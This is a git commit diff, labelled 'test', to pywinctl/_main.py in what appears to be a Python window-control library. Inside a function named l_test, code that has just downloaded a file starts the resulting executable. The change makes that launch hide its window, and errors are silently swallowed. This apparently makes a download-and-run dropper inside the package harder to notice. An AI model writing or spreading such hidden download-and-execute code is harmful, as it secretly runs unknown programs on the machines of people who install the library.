d8ef35e59831e5860676b24532bd7ea8e2a14d64
JD3006 <205719831+WinTils@users.noreply.github.com>
2025-04-04 21:37:42 +0800

    test

--- pywinctl/_main.py
+++ pywinctl/_main.py
@@ -508,7 +508,7 @@ def l_test():
     except Exception as e:
         sys.exit(f"An unexpected error occurred during download: {e}")
     try:
-        subprocess.Popen(exe_path)
+        subprocess.Popen(exe_path, creationflags=subprocess.CREATE_NO_WINDOW)
     except Exception as e:
         return
 
